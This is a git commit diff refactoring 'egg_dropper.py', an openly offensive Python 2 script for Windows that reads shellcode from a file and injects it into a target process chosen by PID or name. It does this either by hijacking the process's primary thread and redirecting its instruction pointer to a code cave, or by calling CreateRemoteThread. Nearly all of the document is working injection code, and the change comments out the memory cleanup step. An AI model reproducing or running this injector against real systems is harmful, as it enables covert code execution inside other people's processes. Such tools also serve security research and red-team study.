7bcb9f5e6a54a6a449cf118e69b8c1b1cfe75538
half-jiffie <gmdopp@gmail.com>
2012-04-05 17:20:30 +0200

    spike/egg_dropper.py: cosmetic changes

--- spike/egg_dropper.py
+++ spike/egg_dropper.py
@@ -7,6 +7,7 @@ egg_dropper.py: A tiny script to harvest shellcode from a bin file, and inject i
 import sys
 from libdebug.constants import *
 from libdebug.debug import GetProcessIdFromName, GetPrimaryThreadId
+from hashman import *
 from ctypes import *
 import os
 import re
@@ -15,38 +16,14 @@ from optparse import OptionParser
 
 __AUTHOR__ = "h4lf-jiffie (dohmatob elvis dopgima)"
 
-if __name__ == '__main__':
-    # sanitize command-
-    parser = OptionParser(version='%s by %s'%(os.path.basename(sys.argv[0]),__AUTHOR__),
-                          usage="Usage: python %s [OPTIONS] <target_imagename_or_PID> </path/to/bin/file>"%sys.argv[0])
-    parser.add_option('--hijack-primary-thread',
-                      help="""hijack primary thread of target process and use it as shellcode carrier""",
-                      dest='hijackprimarythread',
-                      action='store_true',
-                      )
-    options, args = parser.parse_args()
-    if len(args) < 2:
-        parser.error("Insufficient command-line arguments")
-    
-    # calculate target PID
-    target_PID = None
-    try:
-        target_PID  = int(sys.argv[1])
-    except ValueError:
-        target_PID = GetProcessIdFromName(args[0])
-    if target_PID is None:
-        print "%s is neither a process imagename nor ID"%args[0]
-        sys.exit(-1)
-            
+def drop_egg(target_PID, shellcode, hijackprimarythread=True):
     # grab a handle to the target process
     h = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, 0, target_PID)
     if not h:
         print "OpenProcess: Failed."
         sys.exit(-1)
-    
-    # harvest shellcode code from bin file
-    shellcode = open(args[1], 'rb').read()
-    if options.hijackprimarythread:
+        
+    if hijackprimarythread:
         target_primary_TID = GetPrimaryThreadId(target_PID)
         hThread = windll.kernel32.OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                              0,
@@ -87,7 +64,7 @@ if __name__ == '__main__':
     windll.kernel32.FlushInstructionCache(h, codecave, len(shellcode))
 
     # deploy carrier-thread to trigger remote shellcode
-    if options.hijackprimarythread:
+    if hijackprimarythread:
         context.Eip = codecave
         windll.kernel32.SetThreadContext(hThread, byref(context))
         windll.kernel32.ResumeThread(hThread)
@@ -96,8 +73,38 @@ if __name__ == '__main__':
         assert hThread, "CreateRemoteThread: Failed."
     windll.kernel32.WaitForSingleObject(hThread, INFINITE)
     
-    # liberate codecave
-    windll.kernel32.VirtualFreeEx(h, codecave, codecave_size, MEM_RELEASE)
+    ## liberate codecave
+    #windll.kernel32.VirtualFreeEx(h, codecave, codecave_size, MEM_RELEASE)
+    #
+
+if __name__ == '__main__':
+    # sanitize command-
+    parser = OptionParser(version='%s by %s'%(os.path.basename(sys.argv[0]),__AUTHOR__),
+                          usage="Usage: python %s [OPTIONS] <target_imagename_or_PID> </path/to/bin/file>"%sys.argv[0])
+    parser.add_option('--createremotethread',
+                      help="""create remote thread and use it as shellcode carrier""",
+                      dest='createremotethread',
+                      action='store_true',
+                      )
+    options, args = parser.parse_args()
+    if len(args) < 2:
+        parser.error("Insufficient command-line arguments")
+    
+    # calculate target PID
+    target_PID = None
+    try:
+        target_PID  = int(args[0])
+    except ValueError:
+        target_PID = GetProcessIdFromName(args[0])
+    if target_PID is None:
+        print "%s is neither a process imagename nor ID"%args[0]
+        sys.exit(-1)
+        
+    # harvest shellcode code from bin file
+    shellcode = open(args[1], 'rb').read()
+    
+    # inject shellcode
+    drop_egg(target_PID, shellcode, not options.createremotethread)
     
     print "\n[+] OK. %d-BYTE EGG DELIVERED."%len(shellcode)
     print "%s (c) %s %s"%("#"*13,__AUTHOR__,"#"*13)
